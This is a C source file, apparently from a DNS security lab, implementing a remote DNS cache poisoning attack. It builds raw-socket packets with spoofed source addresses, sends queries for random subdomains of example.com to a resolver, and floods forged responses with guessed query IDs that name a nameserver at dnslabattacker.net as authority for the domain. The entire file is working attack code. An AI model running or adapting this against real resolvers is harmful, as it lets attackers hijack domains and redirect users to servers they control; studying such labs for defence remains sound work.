#include "header.h"

int spoof(char *host, char *src_addr, char *dest_addr)
{
    int sd;                     
    char buffer[PCKT_LEN];       
    memset(buffer, 0, PCKT_LEN); 

    struct ipheader *ip = (struct ipheader *)buffer;
    struct udpheader *udp = (struct udpheader *)(buffer + sizeof(struct ipheader));
    struct dnsheader *dns = (struct dnsheader *)(buffer + sizeof(struct ipheader) + sizeof(struct udpheader));

    // data is the pointer points to the first byte of the dns payload
    char *data = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader));

    dns->flags = htons(FLAG_R);
    dns->QDCOUNT = htons(1);
    dns->ANCOUNT = htons(1);
    dns->NSCOUNT = htons(1);
    dns->ARCOUNT = htons(1);

    strcpy(data, host);
    int length = strlen(data) + 1;
    struct dataEnd *end = (struct dataEnd *)(data + length);
    end->type = htons(1);
    end->class = htons(1);

    // answer
    char *ans = (data + sizeof(struct dataEnd) + length);
    strcpy(ans, host);
    int anslength = strlen(ans) + 1;
    struct answerEnd *answer = (struct answerEnd *)(ans + anslength);
    answer->type = htons(1);
    answer->class = htons(1);
    answer->ttl = htonl(0x10000);
    answer->datalen = htons(4);
    char *ansaddr = (ans + sizeof(struct answerEnd) + anslength - 2);
    strcpy(ansaddr, "\1\1\1\1");
    int ansaddrlen = strlen(ansaddr);

    // authority
    char *aus = (ansaddr + ansaddrlen);
    strcpy(aus, "\7example\3com");
    int auslength = strlen(aus) + 1;
    struct authorEnd *ausend = (struct authorEnd *)(aus + auslength);
    ausend->type = htons(2);
    ausend->class = htons(1);
    ausend->ttl = htonl(0x10000);
    ausend->datalen = htons(23);
    char *ausname = (aus + auslength + sizeof(struct authorEnd) - 2);
    strcpy(ausname, "\2ns\16dnslabattacker\3net");
    int ausnamelen = strlen(ausname) + 1;

    // additional
    char *ads = (ausname + ausnamelen);
    strcpy(ads, "\2ns\16dnslabattacker\3net");
    int adslength = strlen(ads) + 1;
    struct answerEnd *adsend = (struct answerEnd *)(ads + adslength);
    adsend->type = htons(1);
    adsend->class = htons(1);
    adsend->ttl = htonl(0x15104);
    adsend->datalen = htons(4);
    char *adsaddr = (ads + adslength + sizeof(struct answerEnd) - 2);
    strcpy(adsaddr, "\1\1\1\1");
    int adsaddrlen = strlen(adsaddr) + 1;

    struct sockaddr_in sin, din;
    int one = 1;
    const int *val = &one;

    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);

    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;
    sin.sin_port = htons(33333);
    din.sin_port = htons(53);
    sin.sin_addr.s_addr = inet_addr(src_addr);
    din.sin_addr.s_addr = inet_addr(ORIN_ADDRESS);

    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0;
    unsigned short int packetLength = (sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct answerEnd) + anslength + ansaddrlen + auslength + sizeof(struct authorEnd) + ausnamelen + adslength + sizeof(struct answerEnd) + adsaddrlen);

    ip->iph_len = htons(packetLength);
    ip->iph_ident = htons(rand()); // we give a random number for the identification#
    ip->iph_ttl = 110;
    ip->iph_protocol = 17;
    ip->iph_sourceip = inet_addr(ORIN_ADDRESS);
    ip->iph_destip = inet_addr(src_addr);

    udp->udph_srcport = htons(53);
    udp->udph_destport = htons(33333);
    udp->udph_len = htons(sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) 
        + length + sizeof(struct answerEnd) + anslength + ansaddrlen + auslength + sizeof(struct authorEnd) 
        + ausnamelen + adslength + sizeof(struct answerEnd) + adsaddrlen); 

    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader));

    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        printf("error\n");
        exit(-1);
    }

    int i = rand() - 2000;
    for (int n = 0; n < MAX_N; n++)
    {
        dns->query_id = htons(i + count);
        udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader));
        if (sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
            printf("packet send error %d which means %s\n", errno, strerror(errno));
    }
    close(sd);
    return 0;
}

int main(int argc, char *argv[])
{
    if (argc != 3)
    {
        printf("- Invalid parameters!!!\nPlease enter 2 ip addresses\nFrom first to last:src_IP  dest_IP  \n");
        exit(-1);
    }

    int sd;
    char buffer[PCKT_LEN];
    memset(buffer, 0, PCKT_LEN);

    struct ipheader *ip = (struct ipheader *)buffer;
    struct udpheader *udp = (struct udpheader *)(buffer + sizeof(struct ipheader));
    struct dnsheader *dns = (struct dnsheader *)(buffer + sizeof(struct ipheader) + sizeof(struct udpheader));
    char *data = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader));

    dns->flags = htons(FLAG_Q);
    dns->QDCOUNT = htons(1);

    strcpy(data, "\5aaaaa\7example\3com");
    int length = strlen(data) + 1;

    struct dataEnd *end = (struct dataEnd *)(data + length);
    end->type = htons(1);
    end->class = htons(1);

    struct sockaddr_in sin, din;
    int one = 1;
    const int *val = &one;
    dns->query_id = rand();

    // Create a raw socket with UDP protocol
    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sd < 0)
        printf("socket error\n");

    // The source is redundant, may be used later if needed
    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;
    sin.sin_port = htons(33333);
    din.sin_port = htons(53);
    sin.sin_addr.s_addr = inet_addr(argv[2]); // this is the second argument we input into the program
    din.sin_addr.s_addr = inet_addr(argv[1]); // this is the first argument we input into the program

    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0;
    unsigned short int packetLength = (sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + length + sizeof(struct dataEnd));
    // length + dataEnd_size == UDP_payload_size

    ip->iph_len = htons(packetLength);
    ip->iph_ident = htons(rand());
    ip->iph_ttl = 110;
    ip->iph_protocol = 17; // UDP
    // Source IP address, can use spoofed address here!!!
    ip->iph_sourceip = inet_addr(argv[1]);
    ip->iph_destip = inet_addr(argv[2]);

    // Fabricate the UDP header. Source port number, redundant
    udp->udph_srcport = htons(40000 + rand() % 10000); // source port number, I make them random... remember the lower number may be reserved
    udp->udph_destport = htons(53);
    udp->udph_len = htons(sizeof(struct udpheader) + sizeof(struct dnsheader) + length + sizeof(struct dataEnd)); // udp_header_size + udp_payload_size
    // Calculate the checksum for integrity//
    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader));

    /*******************************************************************************8
    Tips：
        the checksum is quite important to pass the checking integrity. You need 
    to study the algorithem and what part should be taken into the calculation.

    Just for knowledge purpose,remember the seconed parameter for UDP checksum:
        ipheader_size + udpheader_size + udpData_size  
    for IP checksum: 
        ipheader_size + udpheader_size
    *********************************************************************************/

    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        printf("error\n");
        exit(-1);
    }

    while (1)
    {
        int charnumber;
        charnumber = 1 + rand() % 5;
        *(data + charnumber) += 1;

        udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader));
        if (sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
            printf("packet send error %d which means %s\n", errno, strerror(errno));

        spoof(data, argv[2], argv[1]);
        sleep(0.5);
    }
    close(sd);
    return 0;
}